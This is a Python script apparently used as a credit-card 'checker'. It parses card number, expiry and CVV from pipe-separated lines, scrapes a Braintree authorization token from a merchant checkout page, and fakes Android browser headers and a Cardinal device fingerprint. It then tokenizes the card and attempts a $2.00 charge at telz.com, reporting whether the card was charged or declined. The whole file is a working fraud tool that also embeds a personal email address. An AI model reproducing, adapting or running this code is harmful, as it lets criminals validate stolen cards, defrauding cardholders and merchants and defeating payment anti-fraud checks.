import requests
import uuid
import re
import base64
import json
import jwt
import random
from fake_useragent import UserAgent
from user_agent import generate_user_agent



def bran(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	uu = generate_user_agent() 
	r = requests.Session()
	def get_working_url():
	    file_path = 'links.txt'
	    with open(file_path, 'r') as file:
	        uuides = [line.strip() for line in file if line.strip()]
	
	    if not uuides:
	        raise ValueError("No links in file")
	
	    while uuides:
	        uuid_url = random.choice(uuides)
	        ua = generate_user_agent()
	        s = requests.Session()
	
	        try:
	            resp = s.get(
	                url=uuid_url,
	                headers={"User-Agent": ua}
	            )
	
	            aur = re.search(
	                r"authorization\s*:\s*checkbox\.is\(.+?\)\s*\?\s*''\s*:\s*'([^']+)'",
	                resp.text
	            ).group(1)
	
	            if aur:
	                return uuid_url
	
	            uuides.remove(uuid_url)
	
	        except Exception as e:
	            print(e)
	            uuides.remove(uuid_url)
	        with open(file_path, "w") as f:
	            f.write("\n".join(uuides) + ("\n" if uuides else ""))
	
	    raise ValueError("No working URL found")
	
	uu = get_working_url()
	res = r.get(uu)
	#print(res.text)
	uuis = re.search("transaction_uuid: '(.*?)'", res.text).group(1)
	auth_checked = re.search(r"authorization\s*:\s*checkbox\.is\(.+?\)\s*\?\s*''\s*:\s*'([^']+)'", res.text).group(1)
	dec = base64.b64decode(auth_checked).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
	#print(au)
	
	
	ssir = str(uuid.uuid4())
	
	url = "https://payments.braintree-api.com/graphql"
	
	payload = {
	  "clientSdkMetadata": {
	    "source": "client",
	    "integration": "custom",
	    "sessionId": ssir
	  },
	  "query": "query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT         cardinalSongbirdUrl         cardinalSongbirdIdentityHash       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     fastlane {       enabled       tokensOnDemand {         enabled         tokenExchange {           enabled         }       }     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }",
	  "operationName": "ClientConfiguration"
	}
	
	headers = {
	  'User-Agent': uu,
	  'Accept-Encoding': "gzip, deflate, br, zstd",
	  'Content-Type': "application/json",
	  'sec-ch-ua-platform': "\"Android\"",
	  'authorization': f"Bearer {au}",
	  'braintree-version': "2018-05-10",
	  'sec-ch-ua': "\"Android WebView\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
	  'sec-ch-ua-mobile': "?1",
	  'origin': "https://telz.com",
	  'x-requested-with': "com.nettia",
	  'sec-fetch-site': "cross-site",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
	  'priority': "u=1, i"
	}
	
	response = r.post(url, data=json.dumps(payload), headers=headers)
	
	car=response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
	#print(car)
	
	
	
	url = "https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init"
	
	payload = {
	  "BrowserPayload": {
	    "Order": {
	      "OrderDetails": {},
	      "Consumer": {
	        "BillingAddress": {},
	        "ShippingAddress": {},
	        "Account": {}
	      },
	      "Cart": [],
	      "Token": {},
	      "Authorization": {},
	      "Options": {},
	      "CCAExtension": {}
	    },
	    "SupportsAlternativePayments": {
	      "cca": True,
	      "hostedFields": False,
	      "applepay": False,
	      "discoverwallet": False,
	      "wallet": False,
	      "paypal": False,
	      "visacheckout": False
	    }
	  },
	  "Client": {
	    "Agent": "SongbirdJS",
	    "Version": "1.35.0"
	  },
	  "ConsumerSessionId": "0_c9bd6fe1-0dc3-488d-a579-7fc5654726d5",
	  "ServerJWT": car, 
	}
	
	headers = {
	  'User-Agent': uu,
	  'Accept-Encoding': "gzip, deflate, br, zstd",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-ch-ua': "\"Android WebView\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
	  'content-type': "application/json;charset=UTF-8",
	  'x-cardinal-tid': "Tid-e72ede2f-9c0a-4d54-a198-ae1d0a2e4912",
	  'sec-ch-ua-mobile': "?1",
	  'origin': "https://telz.com",
	  'x-requested-with': "com.nettia",
	  'sec-fetch-site': "cross-site",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
	  'priority': "u=1, i"
	}
	
	response = r.post(url, data=json.dumps(payload), headers=headers)
	
	payload = response.json()['CardinalJWT']
	ali2 = jwt.decode(payload, options={"verify_signature": False})
	reid = ali2['ReferenceId']
	#print(reid)
	
	
	
	url = "https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData"
	
	payload = {
	  "Cookies": {
	    "Legacy": True,
	    "LocalStorage": None,
	    "SessionStorage": True
	  },
	  "DeviceChannel": "Browser",
	  "Extended": {
	    "Browser": {
	      "Adblock": True,
	      "AvailableJsFonts": [],
	      "DoNotTrack": "unknown",
	      "JavaEnabled": False
	    },
	    "Device": {
	      "ColorDepth": 24,
	      "Cpu": "unknown",
	      "Platform": "Linux aarch64",
	      "TouchSupport": {
	        "MaxTouchPoints": 5,
	        "OnTouchStartAvailable": True,
	        "TouchEventCreationSuccessful": True
	      }
	    }
	  },
	  "Fingerprint": "9baa474b2db059f7487a4f351f4e209c",
	  "FingerprintingTime": 1286,
	  "FingerprintDetails": {
	    "Version": "1.5.1"
	  },
	  "Language": "ar-EG",
	  "Latitude": None,
	  "Longitude": None,
	  "OrgUnitId": "64b72decf2fb5560fbab1da4",
	  "Origin": "Songbird",
	  "Plugins": [],
	  "ReferenceId": reid,
	  "Referrer": "",
	  "Screen": {
	    "FakedResolution": False,
	    "Ratio": 2.2222222222222223,
	    "Resolution": "800x360",
	    "UsableResolution": "800x360",
	    "CCAScreenSize": "01"
	  },
	  "CallSignEnabled": None,
	  "ThreatMetrixEnabled": False,
	  "ThreatMetrixEventType": "PAYMENT",
	  "ThreatMetrixAlias": "Default",
	  "TimeOffset": -180,
	  "UserAgent": uu,
	  "UserAgentDetails": {
	    "FakedOS": False,
	    "FakedBrowser": False
	  },
	  "BinSessionId": "1fa1a850-f700-4be9-a295-a2b773bb3204"
	}
	
	headers = {
	  'User-Agent': uu,
	  'Accept-Encoding': "gzip, deflate, br, zstd",
	  'Content-Type': "application/json",
	  'sec-ch-ua-platform': "\"Android\"",
	  'x-requested-with': "XMLHttpRequest",
	  'sec-ch-ua': "\"Android WebView\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
	  'sec-ch-ua-mobile': "?1",
	  'origin': "https://geo.cardinalcommerce.com",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'sec-fetch-storage-access': "active",
	  'referer': "https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=64b72decf2fb5560fbab1da4&tmEventType=PAYMENT&referenceId=0_c9bd6fe1-0dc3-488d-a579-7fc5654726d5&geolocation=false&origin=Songbird",
	  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
	  'priority': "u=1, i"
	}
	
	response = r.post(url, data=json.dumps(payload), headers=headers)
	
	
	
	
	url = "https://payments.braintree-api.com/graphql"
	
	payload = {
	  "clientSdkMetadata": {
	    "source": "client",
	    "integration": "dropin2",
	    "sessionId": ssir
	  },
	  "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }",
	  "variables": {
	    "input": {
	      "creditCard": {
	        "number": n,
	        "expirationMonth": mm,
	        "expirationYear": yy,
	        "cvv": cvc,
	        "cardholderName": "ALI"
	      },
	      "options": {
	        "validate": False
	      }
	    }
	  },
	  "operationName": "TokenizeCreditCard"
	}
	
	headers = {
	  'User-Agent': uu,
	  'Accept-Encoding': "gzip, deflate, br, zstd",
	  'Content-Type': "application/json",
	  'sec-ch-ua-platform': "\"Android\"",
	  'authorization': f"Bearer {au}",
	  'braintree-version': "2018-05-10",
	  'sec-ch-ua': "\"Android WebView\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
	  'sec-ch-ua-mobile': "?1",
	  'origin': "https://assets.braintreegateway.com",
	  'x-requested-with': "com.nettia",
	  'sec-fetch-site': "cross-site",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://assets.braintreegateway.com/",
	  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
	  'priority': "u=1, i"
	}
	
	response = r.post(url, data=json.dumps(payload), headers=headers)
	
	
	tok = response.json()['data']['tokenizeCreditCard']['token']
		
		
		
	
	url = f"https://api.braintreegateway.com/merchants/jspypptbtb2hwgpp/client_api/v1/payment_methods/{tok}/three_d_secure/lookup"
	
	payload = {
	  "amount": "2.00",
	
	  "additionalInfo": {
	    "acsWindowSize": "03",
	    "email": "karmnil2003@gmail.com"
	  },
	  "bin": "515462",
	  #"dfReferenceId": reid,
	  "clientMetadata": {
	
	    "cardinalDeviceDataCollectionTimeElapsed": 105,
	    "issuerDeviceDataCollectionTimeElapsed": 1808,
	    "issuerDeviceDataCollectionResult": True
	  },
	  "authorizationFingerprint": au, 
	  "braintreeLibraryVersion": "braintree/web/3.123.2",
	  "_meta": {
	    "merchantAppId": "telz.com",
	    "platform": "web",
	    "sdkVersion": "3.123.2",
	    "source": "client",
	    "integration": "custom",
	    "integrationType": "custom",
	    "sessionId": "56053312-0969-43be-acef-7e4c646183a0"
	  }
	}
	
	headers = {
	  'User-Agent': uu,
	  'Accept-Encoding': "gzip, deflate, br, zstd",
	  'Content-Type': "application/json",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-ch-ua': "\"Android WebView\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
	  'sec-ch-ua-mobile': "?1",
	  'origin': "https://telz.com",
	  'x-requested-with': "com.nettia",
	  'sec-fetch-site': "cross-site",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
	  'priority': "u=1, i"
	}
	
	response = r.post(url, data=json.dumps(payload), headers=headers)
	
	nonc = (response.json()['paymentMethod']['nonce'])
	
	
	
	url = "https://telz.com/cards/bt_nonce"
	
	params = {
	  'uuid': uuis,
	  'nonce': nonc,
	  'email': "karmnil2003@gmail.com",
	  'deviceData': "{\"correlation_id\":\"56053312-0969-43be-acef-7e4c6461\"}",
	  'is_vault': "No Vault",
	  'auto_top_up_enabled': "Disabled"
	}
	
	headers = {
	  'User-Agent': uu,
	  'Accept': "application/json, text/javascript, */*; q=0.01",
	  'sec-ch-ua-mobile': "?1",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
	  'priority': "u=1, i",
	}
	
	response = r.get(url, params=params, headers=headers)
	if 'OK' in response.text:
		return 'CHARGE 2.00$'
	elif 'insufficient funds' in response.text or 'funds' in response.text or 'Funds' in response.text:
		return 'insufficient funds'
	else:
		mes = re.search(r'"msg"\s*:\s*"([^"]+)"',response.text).group(1)
		return mes